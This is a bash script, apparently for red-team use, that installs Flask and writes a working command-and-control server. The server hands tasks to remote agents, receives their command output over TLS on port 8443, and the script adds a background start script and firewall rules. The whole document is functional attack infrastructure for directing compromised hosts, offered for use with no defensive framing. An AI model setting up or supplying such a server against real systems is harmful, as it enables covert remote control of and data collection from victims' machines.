#!/bin/bash

echo "[*] Updating system..."
sudo apt update && sudo apt upgrade -y

echo "[*] Installing Python and Flask..."
sudo apt install -y python3 python3-pip ufw
pip3 install flask

echo "[*] Creating C2 directory structure..."
mkdir -p ~/c2_server/certs
cd ~/c2_server

echo "[*] Writing C2 server script..."
cat > server.py << 'EOF'
from flask import Flask, request
import json, os

app = Flask(__name__)
DB_FILE = "task_db.json"

if not os.path.exists(DB_FILE):
    with open(DB_FILE, "w") as f:
        json.dump({}, f)

def load_tasks():
    with open(DB_FILE) as f:
        return json.load(f)

def save_tasks(data):
    with open(DB_FILE, "w") as f:
        json.dump(data, f)

@app.route("/task/<agent_id>", methods=["GET"])
def get_task(agent_id):
    tasks = load_tasks()
    return tasks.pop(agent_id, "") or ""

@app.route("/result/<agent_id>", methods=["POST"])
def post_result(agent_id):
    print(f"[+] Result from {agent_id}: {request.form['output']}")
    return "OK"

@app.route("/set/<agent_id>", methods=["POST"])
def set_task(agent_id):
    tasks = load_tasks()
    tasks[agent_id] = request.form["task"]
    save_tasks(tasks)
    return "Task set"

if __name__ == "__main__":
    context = ("certs/cert.pem", "certs/key.pem")
    app.run(host="0.0.0.0", port=8443, ssl_context=context)
EOF

echo "[*] Generating self-signed TLS certificate..."
openssl req -new -x509 -days 365 -nodes \
    -out certs/cert.pem -keyout certs/key.pem \
    -subj "/C=IN/ST=RedTeam/L=CyberOps/O=C2Project/CN=$(curl -s ifconfig.me)"

echo "[*] Creating manual start script..."
cat > start_c2.sh << 'EOF'
#!/bin/bash
cd "$(dirname "$0")"
nohup python3 server.py > c2.log 2>&1 &
echo "[+] C2 server started. Check logs: c2.log"
EOF

chmod +x start_c2.sh

echo "[*] Allowing required ports through UFW..."
sudo ufw allow 22
sudo ufw allow 8443
sudo ufw --force enable

echo "[✔] Setup complete. To start your C2 server, run:"
echo "     ~/c2_server/start_c2.sh"
